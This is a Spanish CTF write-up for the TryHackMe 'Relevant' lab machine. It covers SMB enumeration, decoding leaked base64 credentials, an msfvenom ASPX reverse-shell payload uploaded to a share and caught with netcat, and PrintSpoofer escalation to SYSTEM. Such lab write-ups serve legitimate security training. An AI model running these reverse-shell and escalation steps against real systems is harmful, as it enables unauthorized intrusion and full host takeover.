@@ -1,0 +1,420 @@
+**Relevant:** Hay varias formas de completar esta maquina pero mi manera fue usando una vulnerabilidad conocida relacionada con los servidores Samba.
+
+
+Primero comenzamos con la fase de Reconocimiento.
+```bash
+sudo nmap -p- -sSC --open --min-rate 5000 -n -Pn 10.10.20.130
+```
+*Nos devuelve estos servicios activos*
+Puerto|Servicio|
+------|--------|
+80| HTTP | 
+135|MSRPC|
+139| SMB |
+445| SMB |
+3389| RDP|
+49663|HTTP|
+49666| MSRPC|
+
+Una vez identificamos los puertos y servicios activos, realizaremos un escaneo mas detallado:
+```bash
+# Nmap 7.92 scan initiated Mon Nov 15 21:28:55 2021 as: nmap -p 80,135,139,445,3389,49667,49669 -sCV -T4 -oN AllPorts.txt 10.10.20.130
+Nmap scan report for 10.10.20.130
+Host is up (0.28s latency).
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-11-16T02:31:37+00:00
+|_ssl-date: 2021-11-16T02:32:16+00:00; +1m40s from scanner time.
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2021-11-15T02:21:03
+|_Not valid after:  2022-05-17T02:21:03
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h37m40s, deviation: 3h34m41s, median: 1m39s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-11-16T02:31:38
+|_  start_date: 2021-11-16T02:21:48
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-11-15T18:31:39-08:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Nov 15 21:30:37 2021 -- 1 IP address (1 host up) scanned in 101.63 seconds
+```
+
+Podemos observar un servicio **SMB** presenta una vulnerabilidad CVE-2017-0143.
+
+MS17-010 o tambien conocido como EternalBlue
+https://es.wikipedia.org/wiki/EternalBlue
+
+___
+Procederemos a ingresar al Samba client.
+
+```bash
+┌──(temerio㉿Hackademy)-[~]
+└─$ smbclient -L //10.10.20.130/                                               
+Enter WORKGROUP\temerio's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk      
+SMB1 disabled -- no workgroup available
+```
+___
+Al enumerar los recursos compartidos del servidor, podremos ver el recurso llamado **nt4wrksv**  al que podemos acceder sin contraseña, tal vez el recurso compartido y el subdirectorio estén vinculados.
+
+
+```bash                                                                          
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Relevant]
+└─$ smbclient \\\\10.10.20.130\\nt4wrksv
+Enter WORKGROUP\temerio's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jul 25 17:46:04 2020
+  ..                                  D        0  Sat Jul 25 17:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+                7735807 blocks of size 4096. 5142549 blocks available
+
+```
+___
+Vemos que el recurso compartido aloja en su interior un archivo llamado **passwords.txt** al cual podremos extraer hacia nuestra PC con el comando "get". Luego abriremos el mismo.
+
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Relevant]
+└─$ cat passwords.txt 
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+```
+___
+A simple vista podemos ver que el texto esta Hardcodeado en base64 procedemos con la decodificacion de las strings.
+
+
+```bash                                
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Relevant]
+└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d              
+Bob - !P@$$W0rD!123
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Relevant]
+└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+Bill - Juw4nnaM4n420696969!$$$    
+```
+Nos devolvio dos posibles usuarios y contraseñas la cual nos puede ayudar mas adelante.
+___
+## Local Privilege Escalation
+___
+
+*Aqui es importante crear la ReverseShell luego crear tu escucha desde Netcat para posteriormente subir el archivo creado al SMBclient concediendote el acceso a la maquina victima posterior a ejecutar la ReverseShell.*
+
+Comenzamos creando la Shell Reverse mediante msfvenom y añadimos nuestro local host y el puerto a usar.
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Relevant]
+└─$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.20.130 LPORT=4545 -f aspx -o relv.aspx            1 ⨯
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3392 bytes
+Saved as: relv.aspx
+
+```
+___
+*Recordar que SMB For Shares al ser un recurso compartido no solo se puede descargar archivos sinó que tambien subirlos.*
+
+Procedemos a subir nuestro archivo con la ReverseShell previamente creado mediante el comando "Put".
+
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Relevant]
+└─$ smbclient \\\\10.10.20.130\\nt4wrksv                      
+Enter WORKGROUP\temerio's password: 
+Try "help" to get a list of possible commands.
+smb: \> put relv.aspx 
+putting file relv.aspx as \relv.aspx (4.5 kb/s) (average 4.5 kb/s)
+
+```
+___
+*Una vez subido dicho archivo lo ejecutaremos desde su direccion URL: http://10.10.20.130:49663/nt4wrksv/relv.aspx*
+```bash
+┌──(temerio㉿Hackademy)-[~]
+└─$ nc -lvp 4545                                               
+listening on [any] 4545 ...
+10.10.20.130: inverse host lookup failed: Unknown host
+connect to [10.8.225.45] from (UNKNOWN) [10.10.20.130] 49733
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+```
+*Asi de facil obtuvimos acceso a la maquina victima.*
+___
+
+Ahora tenemos privilegios locales en el servidor de Windows. Hagamos una enumeración del sistema operativo y recuperemos información básica, así como también verifiquemos los puntos de entrada para el escalamiento del sistema.
+
+ 
+```bash
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+Vemos que esta habilitado **SeImpersonatePrivilege.** 
+___
+Procedemos a ver listar la carecteristicas del 
+```bash
+c:\windows\system32\inetsrv>systeminfo                                                                                                  
+systeminfo
+
+Host Name:                 RELEVANT
+OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00378-00000-00000-AA739
+Original Install Date:     7/25/2020, 7:56:59 AM
+System Boot Time:          11/12/2021, 6:19:15 PM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
+BIOS Version:              Xen 4.11.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     512 MB
+Available Physical Memory: 92 MB
+Virtual Memory: Max Size:  1,536 MB
+Virtual Memory: Available: 944 MB
+Virtual Memory: In Use:    592 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 3 Hotfix(s) Installed.
+                           [01]: KB3192137
+                           [02]: KB3211320
+                           [03]: KB3213986
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.20.130
+                                 [02]: fe80::80a7:340a:bf9d:5862
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+___
+## System Privilege Escalation
+___
+Tenemos varios permisos para un sistema operativo Windows Server 2016. Tenemos el SeImpersonatePrivilege emparejado con Windows Server 2016, lo que significa que esta máquina es vulnerable a PrintSpoof, lo que nos permite un shell con privilegios de sistema.Por lo tanto procedemos a clonar PrintSpoof desde repositorio, una vez dentro de la carpeta nos conectamos mediante SMBclient y con un Put subimos el ejecutable.
+https://github.com/dievus/printspoofer
+
+
+*Nos dirigimos a la carpeta donde alojamos nuestro reverse shell.*
+
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/Relevant/printspoofer]
+└─$ smbclient \\\\10.10.20.130\\nt4wrksv
+Enter WORKGROUP\temerio's password: 
+Try "help" to get a list of possible commands.
+smb: \> put PrintSpoofer.exe 
+putting file PrintSpoofer.exe as \PrintSpoofer.exe (26.8 kb/s) (average 26.8 kb/s)
+smb: \> 
+
+```
+___
+Una vez subido nos vamos a su direccion dentro del systema y al encontrarlo lo ejecutaremos con "PrintSpoofer.exe -i -c cmd".
+```bash
+c:\windows\system32\inetsrv>cd ..
+cd ..
+
+c:\Windows\System32>cd ..
+cd ..
+
+c:\Windows>cd ..
+cd ..
+
+c:\>dir         
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\
+
+07/25/2020  07:16 AM    <DIR>          inetpub
+07/25/2020  07:42 AM    <DIR>          Microsoft
+07/16/2016  05:23 AM    <DIR>          PerfLogs
+07/25/2020  07:00 AM    <DIR>          Program Files
+07/25/2020  03:15 PM    <DIR>          Program Files (x86)
+07/25/2020  01:03 PM    <DIR>          Users
+07/25/2020  03:16 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               7 Dir(s)  21,144,723,456 bytes free
+
+c:\>cd inetpub
+cd inetpub
+
+c:\inetpub>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\inetpub
+
+07/25/2020  07:16 AM    <DIR>          .
+07/25/2020  07:16 AM    <DIR>          ..
+07/25/2020  07:07 AM    <DIR>          history
+07/25/2020  07:05 AM    <DIR>          logs
+07/25/2020  07:05 AM    <DIR>          temp
+07/25/2020  01:46 PM    <DIR>          wwwroot
+07/25/2020  01:04 PM    <DIR>          wwwroot1
+               0 File(s)              0 bytes
+               7 Dir(s)  21,144,723,456 bytes free
+
+c:\inetpub>cd wwwroot
+cd wwwroot
+
+c:\inetpub\wwwroot>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\inetpub\wwwroot
+
+07/25/2020  01:46 PM    <DIR>          .
+07/25/2020  01:46 PM    <DIR>          ..
+07/25/2020  07:05 AM    <DIR>          aspnet_client
+07/25/2020  07:05 AM               703 iisstart.htm
+07/25/2020  07:05 AM            99,710 iisstart.png
+11/12/2021  06:30 PM    <DIR>          nt4wrksv
+               2 File(s)        100,413 bytes
+               4 Dir(s)  21,144,723,456 bytes free
+
+c:\inetpub\wwwroot>cd nt4wrsksv 
+cd nt4wrsksv
+The system cannot find the path specified.
+
+c:\inetpub\wwwroot>cd nt4wrksv
+cd nt4wrksv
+
+c:\inetpub\wwwroot\nt4wrksv>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\inetpub\wwwroot\nt4wrksv
+
+11/12/2021  06:50 PM    <DIR>          .
+11/12/2021  06:50 PM    <DIR>          ..
+07/25/2020  07:15 AM                98 passwords.txt
+11/12/2021  06:50 PM            27,136 PrintSpoofer.exe
+11/12/2021  06:30 PM             3,392 relv.aspx
+               3 File(s)         30,626 bytes
+               2 Dir(s)  21,144,723,456 bytes free
+
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+```
+___
+*Todo el trabajo que hicimos fue para escalar privilegios. veamos si fue exitoso*
+```bash
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+*Somos Nt Authority/System tenemos los maximos privilegios posibles en un Windows. Solo queda buscar las flags.*
+___
+
+
+```bash
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+THM{FLAG}
+```
+```bash
+C:\Users\Administrator\Desktop>cd C:\Users\Bob\Desktop
+cd C:\Users\Bob\Desktop
+
+C:\Users\Bob\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of C:\Users\Bob\Desktop
+
+07/25/2020  01:04 PM    <DIR>          .
+07/25/2020  01:04 PM    <DIR>          ..
+07/25/2020  07:24 AM                35 user.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  21,144,653,824 bytes free
+
+C:\Users\Bob\Desktop>type user.txt
+type user.txt
+THM{FLAG}
+C:\Users\Bob\Desktop>
+```
+___
+Ya tenemos todo para completar la Room :).
+
+*Recuerden que esta room tiene muchas formas de ser accedida y esta programada para que se realize un Reporte de Penetration Test.*
+
+Temerio
+
